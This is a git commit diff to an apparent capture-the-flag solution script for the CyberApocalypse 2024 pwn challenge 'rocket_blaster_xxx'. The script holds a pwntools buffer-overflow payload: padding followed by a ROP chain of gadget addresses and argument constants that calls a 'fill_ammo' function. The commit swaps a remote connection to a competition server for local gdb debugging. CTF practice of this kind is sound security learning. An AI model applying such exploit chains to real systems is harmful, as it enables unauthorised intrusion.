f70497942864e4676198b15acf76f61f9be23c65
szhan21 <shunda.zhang@intel.com>
2024-03-10 19:47:20 +0800

    ctf

--- CyberApocalypse2024/pwn/pwn_rocket_blaster_xxx/dec.py
+++ CyberApocalypse2024/pwn/pwn_rocket_blaster_xxx/dec.py
@@ -20,9 +20,10 @@ fill_ammo = 0x4012f5
 
 shellcode = offset*b'A'+p64(0x000000000040159f) + p64(0xdeadbeef) + p64(0x000000000040159d) + p64(0xdeadbabe) + p64(0x000000000040159b) + p64(0xdead1337) + p64(fill_ammo)
 
-ip, port = '94.237.53.121', 41229
-io = remote(ip, port)
+#ip, port = '94.237.53.121', 41229
+#io = remote(ip, port)
 #io = process('./rocket_blaster_xxx')
+io = gdb.debug('./rocket_blaster_xxx', 'break main')
 
 io.recvuntil('>>')
 io.sendline(shellcode)
